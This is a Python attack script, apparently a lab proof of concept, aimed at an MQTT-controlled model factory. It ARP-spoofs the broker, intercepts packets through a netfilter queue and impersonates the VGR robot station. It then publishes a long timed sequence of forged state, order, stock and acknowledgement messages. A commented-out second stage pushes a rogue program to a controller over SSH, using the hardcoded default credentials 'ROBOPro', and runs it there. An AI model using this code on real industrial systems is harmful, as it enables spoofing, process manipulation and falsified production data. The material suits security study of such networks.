import re
import time
import threading
import netfilterqueue
from datetime import timezone, datetime
import logging
import json
import subprocess
import socket

import paho.mqtt.client
import paho.mqtt.client as mqtt
import scapy.all as scapy
import scratch_2
import globs

from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from scp import SCPClient

logger = logging.getLogger("attack_order")
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)

# First we define variables
dst_ip = "192.168.0.10"
dst_port = 1883

order_color = None
wp_id = None
wp_location = None

def broker():
    ss = netfilterqueue.NetfilterQueue()
    ss.bind(22, scratch_2.packet_process)
    ss.run()


def second_attack():
    logger.info("Starting file upload attack on 192.168.0.13")
    # server = '192.168.0.13'
    # port = 22
    # username = password = 'ROBOPro'
    #
    # # create ssh object and connect
    # ssh = SSHClient()
    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
    # ssh.set_missing_host_key_policy(AutoAddPolicy)
    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    #
    # # hijack the established tcp/ssh connection and copy files
    # scp = SCPClient(ssh.get_transport())
    # path = '/home/kali/fischer/vgr/C-Program/'
    # # now copy the rogue program
    # scp.put(f'{path}TxtParkPosVGR', '.')
    #
    # # now run the rogue program
    # ssh.exec_command('./TxtParkPosVGR')
    # time.sleep(7)
    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    # ssh.exec_command('./TxtParkPosVGR')
    # logger.info("Finished file upload attack on 192.168.0.13")

# since threads cannot be restarted by calling the .start(), the workaround is to just pre-create 10 threads in a list
threads_list = {'second_attack': [], 'manual_on_message_trigger': []}
for i in range(10):
        thread = threading.Thread(target=second_attack)
        threads_list['second_attack'].append(thread)
thread_counter = {'second_attack': 0, 'manual_on_message_trigger': 0}


def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        data += new_ts()
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        data += new_ts()
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts_ = f'"ts" : "{ts}"\n' + '}'
    return ts_


def retrieve_from_stock(color, stock):
    global wp_id, wp_location
    stock = stock.decode("utf-8")

    data = json.loads(stock)

    for item in reversed(data['stockItems']):
        if item['workpiece'] and item['workpiece']['type'] == color:
            wp_location = item['location']
            print("wp location is", wp_location)
            wp_id = item['workpiece']['id']
            item['workpiece'] = None
            break


    updated_stock = json.dumps(data, indent=4).replace("    ", "\t").replace(": ", " : ")
    updated_stock_with_ts = re.sub('"ts.*\n}', new_ts(), updated_stock)

    # since a bytes object gets passed into the function, we want to ensure a bytes object gets returned too
    return updated_stock_with_ts.encode('utf-8')


# what happens if a ConnAck packet is received? Then we subscribe
def on_connect(client, *lis):
    # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
    [client.subscribe(x) for x in
     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
    logger.info("Subscription to all topics of interest done")
    time.sleep(0.1)
    # Now we publish our fir
    data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
           '"softwareVersion" : "0.8.1",\n\t"station" : "VGR",\n\t' + new_ts()
    client.publish("fl/broadcast", data, qos=1)

    # Because at this point, 8 packets get sent out, it means the msgid will be 8. We then set userdata as 8 since userdata will be used to simulate mids after legitimate mid of 32
    # Why? At some point along the attack, we will have to wait for an ORDER event before we continue attacking. This
    # wil mean having to resume the attack such a way that looks like there was no pause in the attack (i.e, simulate that msg
    # IDs do not change).
    client.user_data_set(8)
# #---


# What happens if a SubAck is received?
def on_subscribe(client, *lis):
    # Do nothing
    pass


# What happens when a publish message is sent from us and a puback has been received
def on_publish(client, userdata, msgid, *rest):
    global thread_counter, threads_list

    # variable to simulate legitimate msgid just for the purposes of our code
    msgid_sim = client.user_data_get()

    match msgid_sim:
        case 8:
            time.sleep(0.4)
            # Publish for f/i/state/hbw
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "hbw",\n\t' + new_ts()
            client.publish("f/i/state/hbw", data, qos=1)
            client.user_data_set(client.user_data_get()+1)

        case 9:
            # Publish for f/i/state/mpo
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "mpo",\n\t' + new_ts()
            client.publish("f/i/state/mpo", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 10:
            # Publish for f/i/state/sld
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "sld",\n\t' + new_ts()
            client.publish("f/i/state/sld", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 11:
            # Publish for f/i/state/vgr
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "hbw"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 12:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "mpo"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 13:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dso"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 14:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dsi"\n\t' + new_ts()
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 15:
            data = state("0", "0", description="", station="dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 16:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "NONE"\n}'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 17:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t' \
                   '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
        case 18 | 23 | 26 | 27 | 28:
            (active, code) = (1, 2) if msgid_sim in [18, 26] else (0, 1)

            data = state(active, code, "", "vgr", "")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 19 | 21 | 24 | 29 | 31 | 61 | 66 | 68 | 81 | 89 | 98 | 103 | 108 | 110:
            if msgid_sim == 81:
                time.sleep(2)
            if msgid_sim == 98:
                time.sleep(2)
            data = state(0, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 20 | 22 | 25 | 30 | 32 | 62 | 67 | 69 | 99 | 104 | 109 | 111:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 33:
            # wait for an ORDER event to trigger from the local broker (see the on_message() function for more)
            # while waiting, we just keep sending VGR state information
              # where -1 is just user defined so that the case will always default to `case -1`
            # (where nothing will happen) until user_data_set is used in the on_message() function
            logger.info("Listening for order")

            # -----------------------
            # we just publish something to take us to the case -1
            data = state(0, 1, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)


            # -----------------------
            globs.send_state_every_10_seconds_trigger = True
            client.user_data_set("33a")


        case "33a":
            ## ----------------------
            data = state(0, 1, "", "mpo")
            client.publish("f/i/state/mpo", data, qos=1)

            ## ----------------------
            client.user_data_set("33b")

        case "33b":
            ### ----------------------
            data = state(0, 1, "", "sld")
            client.publish("f/i/state/sld", data, qos=1)

            ### ----------------------

            client.user_data_set(-1)

        case 34:
            client.user_data_set("34a")

            data = '{\n\t"code" : 3,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
            client.publish("fl/vgr/do", data, qos=1)

        case "34a":
            client.user_data_set(35)

            # ------------------
            data = state(1, 2, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)
            # ------------------

        # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
        case 35 | 38 | 40 | 41 | 42 | 44 | 46 | 48:
            client.user_data_set(client.user_data_get() + 1)

            if msgid_sim == 38:
                time.sleep(7)
            if msgid_sim == 40:
                time.sleep(1.2)
            if msgid_sim == 41:
                time.sleep(1.5)
            if msgid_sim == 42:
                time.sleep(10)
            if msgid_sim == 46:
                time.sleep(0.2)
            if msgid_sim == 48:
                time.sleep(1)
                
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 43:
            logger.info("Waiting for acknowledgement from HBW")
            time.sleep(4.5)
            # ------------------
            data = state(0, 1, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)
            # ------------------
            client.user_data_set(-1)

        # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
        case 36 | 37 | 39 | 45 | 47:
            client.user_data_set(client.user_data_get() + 1)
            if msgid_sim == 37:
                time.sleep(2.2)
            if msgid_sim == 45:
                time.sleep(2)

            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

        case 49:
            data = '{\n\t"code" : 4,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
            client.publish("fl/vgr/do", data, qos=1)

            client.user_data_set("49a")

        case "49a":
            # ----------------
            data = state(1, 2, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)

            # globs.state_hbw = "BUSY"
            # ----------------
            client.user_data_set(50)

        case 60:
            logger.info("Waiting for mpo/ack code 1")
            client.user_data_set(-1)

        # case block to handle bulk cases where active, code, target is 0,1,mpo respectively
        case 50 | 53 | 55 | 56 | 64 | 65 | 70 | 71 | 72 | 73 | 74:
            client.user_data_set(client.user_data_get() + 1)

            if msgid_sim == 53:
                time.sleep(3.7)
            if msgid_sim == 56:
                time.sleep(6)
            if msgid_sim == 70:
                time.sleep(2.6)
            if msgid_sim == 71:
                client.user_data_set("71a")
            if msgid_sim in [72, 73, 74]:
                time.sleep(10)

            data = state(0, 1, "", "vgr", "mpo")
            client.publish("f/i/state/vgr", data, qos=1)

        case "71a":
            client.user_data_set(72)

            time.sleep(7)

            # -----------------------
            data = state(0, 1, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)
            # -----------------------


        case 75:
            logger.info("Waiting for mpo/ack code 2")
            client.user_data_set(-1)

        # case block to handle bulk cases where active, code, target is 1,2,mpo respectively
        case 51 | 52 | 54 | 59 | 63:
            if msgid_sim == 52:
                time.sleep(2)
            data = state(1, 2, "", "vgr", "mpo")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 57:
            time.sleep(0.5)
            data = '{\n\t"state" : "IN_PROCESS",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 58:
            data = '{\n\t"code" : 7,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % order_color
            client.publish("fl/vgr/do", data, qos=1)
            client.user_data_set("58a")

        case "58a":
            # ----------------
            data = state(1, 2, "", "hbw")
            client.publish("f/i/state/hbw", data, qos=1)

            # globs.state_hbw = "BUSY"
            # ----------------

            client.user_data_set(59)

        case 76:
            logger.info("Waiting for sld/ack")
            client.user_data_set(-1)

        # case block to handle bulk cases where active, code, target is 0,1,dso respectively
        case 78 | 80 | 84 | 86 | 87 | 92 | 94 | 96 | 102 | 106 | 107:
            if msgid_sim == 78:
                time.sleep(3.1)
            if msgid_sim == 80:
                time.sleep(0.6)
            if msgid_sim == 84:
                time.sleep(1.8)
            if msgid_sim == 87:
                time.sleep(1)
            if msgid_sim == 92:
                time.sleep(0.5)
            if msgid_sim == 94:
                time.sleep(1.8)
            if msgid_sim == 96:
                time.sleep(3.4)


            data = state(0, 1, "", "vgr", "dso")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # case block to handle bulk cases where active, code, target is 1,2,dso respectively
        case 77 | 79 | 83 | 85 | 91 | 93 | 95 | 105:
            data = state(1, 2, "", "vgr", "dso")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 82 | 90:
            data = state(1, 1, "", f"dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 88:
            time.sleep(1.4)
            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 800,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + \
                   new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "%s",\n\t\t"state" : "PROCESSED",\n\t\t"type" : "%s"\n\t}\n}' % (wp_id, order_color)
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 97:
            data = '{\n\t"state" : "SHIPPED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 100 | 101:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n }' % order_color
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 112:
            # we've reached the end of our attack. Now, we begin house-cleaning for the next attack run if needed
            # house cleaning asin end threads, reset globals, etc

            # we wait to be sure the SSH attack is done
            logger.info("Waiting for attack to finish, almost there")
            threads_list['second_attack'][thread_counter['second_attack']].join()
            thread_counter['second_attack'] += 1

            #
            threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].join()
            thread_counter['manual_on_message_trigger'] += 1

            globs.state_vgr = "NOT_BUSY"

            client.user_data_set(-1)

            logger.info("First run of attack finished. Listening for order again.")

        case -1:
            pass

        case "33d":
            # quickly publish updated stock to immediately update the order page
            client.publish("f/i/stock", globs.hbw_stock, qos=1)

            logger.info("Order successfully retrieved from Stock")

            client.user_data_set(34)

        case "43b":
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)

            # start file upload attack
            threads_list['second_attack'][thread_counter['second_attack']].start()

            client.user_data_set(44)
            logger.info("Acknowledgement received from HBW with code 1")

        case "60b":
            ## ----------------------
            data = state(1, 2, "", "mpo")
            client.publish("f/i/state/mpo", data, qos=1)
            ## ----------------------

            globs.state_mpo = "BUSY"

            client.user_data_set(61)
            logger.info("Acknowledgement received from MPO with code 1 | MPO started")


        case "75b":
            data = state(0, 1, "", "vgr", "mpo")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set("75c")

        case "75c":
            ### ----------------------
            data = state(1, 2, "", "sld")
            client.publish("f/i/state/sld", data, qos=1)
            ### ----------------------

            globs.state_sld = "BUSY"

            client.user_data_set(76)
            logger.info("Acknowledgement received from MPO with code 2 | MPO ended & SLD started")


        case "76b":
            ### ----------------------
            data = state(0, 1, "", "sld")
            client.publish("f/i/state/sld", data, qos=1)
            ### ----------------------

            globs.state_sld = "NOT_BUSY"

            client.user_data_set(77)
            logger.info("Acknowledgement received from SLD with code 2 | SLD ended")

def on_message(client, userdata, mqttmsg):
    global order_color
    mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json

    if mqttmsg.topic == "f/o/order":
        globs.on_message_event_trigger = True

        # set hbw to BUSY
        globs.state_hbw = "BUSY"
        globs.state_vgr = "BUSY"

        order_color = mqttpayload['type']
        logger.info("Ordered color is: " + order_color)

        data = '{\n\t"state" : "ORDERED",\n\t' + new_ts()[:-2] + ',\n\t"type" : "%s"\n}' % order_color
        client.publish("f/i/order", data, qos=1)

        # update stock once order is received
        logger.info("Retrieving order WP from Stock")
        _ = globs.hbw_stock
        globs.hbw_stock = retrieve_from_stock(order_color, _)

        threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].start()
        logger.info("Order received from Dashboard via broker")


        client.user_data_set("33d")

    if mqttmsg.topic == "fl/hbw/ack" and mqttpayload["code"] == 1:
        # ----------------
        data = state(0, 1, "", "hbw")
        client.publish("f/i/state/hbw", data, qos=1)
        # ----------------
        client.user_data_set("43b")

    if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 1:
        data = state(0, 1, "", "vgr", "mpo")
        client.publish("f/i/state/vgr", data, qos=1)

        client.user_data_set("60b")

    if mqttmsg.topic == "fl/mpo/ack" and mqttpayload["code"] == 2:
        ## ----------------------
        data = state(0, 1, "", "mpo")
        client.publish("f/i/state/mpo", data, qos=1)
        ## ----------------------

        client.user_data_set("75b")

        # for sure HBW should have finished it's process by now so:
        globs.state_hbw = "NOT_BUSY"

    if mqttmsg.topic == "fl/sld/ack" and mqttpayload["code"] == 2:
        globs.state_mpo = "NOT_BUSY"
        data = state(0, 1, "", "vgr", "dso")
        client.publish("f/i/state/vgr", data, qos=1)

        client.user_data_set("76b")


def publish_state_10_seconds():
    pass
    # while globs.send_state_every_10_seconds_trigger is not True:
    #     continue
    #
    # while globs.send_state_every_10_seconds_trigger is True:
    #     if globs.state_vgr == "NOT_BUSY" or globs.state_vgr is None:
    #         print("vgr state")
    #         data = state(0, 1, "", "vgr", "hbw")
    #         aa = mqtt_connect.publish("f/i/state/vgr", data, qos=1)
    #         aa.wait_for_publish()
    #         # time.sleep(5.5)
    #
    #
    #     if globs.state_hbw == "NOT_BUSY" or globs.state_hbw is None:
    #         print("hbw state")
    #         # -----------------------
    #         data = state(0, 1, "", "hbw")
    #         mqtt_connect.publish("f/i/state/hbw", data, qos=1)
    #
    #         while globs.hbw_stock is None:
    #             continue
    #         data = globs.hbw_stock
    #         bb = mqtt_connect.publish("f/i/stock", data, qos=1)
    #         bb.wait_for_publish()
    #         # -----------------------
    #         # time.sleep(3.3)
    #
    #     if globs.state_mpo == "NOT_BUSY" or globs.state_mpo is None:
    #         print("mpo state")
    #         data = state(0, 1, "", "mpo")
    #         cc = mqtt_connect.publish("f/i/state/mpo", data, qos=1)
    #         cc.wait_for_publish()
    #
    #     if globs.state_sld == "NOT_BUSY" or globs.state_sld is None:
    #         print("sld state")
    #         data = state(0, 1, "", "sld")
    #         dd = mqtt_connect.publish("f/i/state/sld", data, qos=1)
    #         dd.wait_for_publish()
    #
    #     time.sleep(10)

"""Dictionary that contains a list of the respective times it takes for each WP (depending on its location on the HBW shelf)
 to transit from the end of (fetching WP from) HBW, to the start of MPO, to end of MPO, and finally to the start SLD.
 Each workpiece will have different times"""
# template is {"workpiece location": ["hbw/ack", "mpo/ack code 1", "mpo/ack code 2", "sld/ack"]}
dict_ = {"B2": [35, 57, 103, 112], "C1": [27, 49, 95, 104], "C3": [42, 64, 110, 119], "B1": [27, 49, 95, 102], "A1": [27, 49, 95, 102]}
# we simply need to add more locations and times to the above dict after analysing/recording more packets. B1 and A1 are simply dups of C1 for POC sake

def manual_on_message_trigger():
    program_start_time = int("{:.0f}".format(time.perf_counter()))

    while globs.on_message_event_trigger is True:
        check = int("{:.0f}".format(time.perf_counter()))

        if check - program_start_time == dict_[wp_location][3]:
            # trigger fl/sld/ack
            oops = paho.mqtt.client.MQTTMessage(0, b"fl/sld/ack")
            oops.payload = b'{"code": 2}'
            on_message(mqtt_connect, None, oops)
            logger.debug("Manual trigger for fl/sld/ack initiated")
            globs.on_message_event_trigger = False

        elif check - program_start_time == dict_[wp_location][2]:
            # trigger fl/mpo/ack, code 2
            oops = paho.mqtt.client.MQTTMessage(0, b"fl/mpo/ack")
            oops.payload = b'{"code": 2}'
            on_message(mqtt_connect, None, oops)
            logger.debug("Manual trigger for fl/mpo/ack with code 2 initiated")

        elif check - program_start_time == dict_[wp_location][1]:
            # trigger fl/mpo/ack, code 1
            oops = paho.mqtt.client.MQTTMessage(0, b"fl/mpo/ack")
            oops.payload = b'{"code": 1}'
            on_message(mqtt_connect, None, oops)
            logger.debug("Manual trigger for fl/mpo/ack with code 1 initiated")

        elif check - program_start_time == dict_[wp_location][0]:
            # trigger fl/hbw/ack
            oops = paho.mqtt.client.MQTTMessage(0, b"fl/hbw/ack")
            oops.payload = b'{"code": 1}'
            on_message(mqtt_connect, None, oops)
            logger.debug("Manual trigger for fl/hbw/ack with code 1 initiated")

        time.sleep(1)


# set IP tables to queue packets
# ss = subprocess.getoutput('iptables -I FORWARD -j NFQUEUE --queue-num 22 -4 -p tcp --dport 1883')

# send 1 arp spoof packet to poison broker arp cache
ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.13')
ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.12')  #hbw
ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.11')  #mpo
ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.14')  #sld

logging.info("Successfully spoofed VGR with just 1 arp packet")

thread_sniffer = threading.Thread(target=broker)
thread_sniffer.start()

for i in range(10):
        thread_manual_on_message_trigger = threading.Thread(target=manual_on_message_trigger)
        threads_list['manual_on_message_trigger'].append(thread_manual_on_message_trigger)


mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.1', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
mqtt_connect.max_queued_messages_set(2)
mqtt_connect.max_inflight_messages_set(1)
mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without username/password
mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=120)


mqtt_connect.on_connect = on_connect
mqtt_connect.on_subscribe = on_subscribe
mqtt_connect.on_publish = on_publish
mqtt_connect.on_message = on_message


thread_send_state_every_10_seconds = threading.Thread(target=publish_state_10_seconds)
thread_send_state_every_10_seconds.start()


mqtt_connect.loop_forever()


# POINTS:
# My ARP attack (sending just 1 arp packet) to the broker works. I believe because I configured my IP tables FORWARD
# chain to drop the packets, the arp attack stop the broker program. The broker program while stopped (likely after a
# timeout that may have been included in the broker programming), doesn't send out
# any packets that would cause the arp cache on it to roll back to original
# and because the BROKER Program stops, the VGR program stops too (because it sends packets to the broker and gets no
# response). And as a result our attack is possible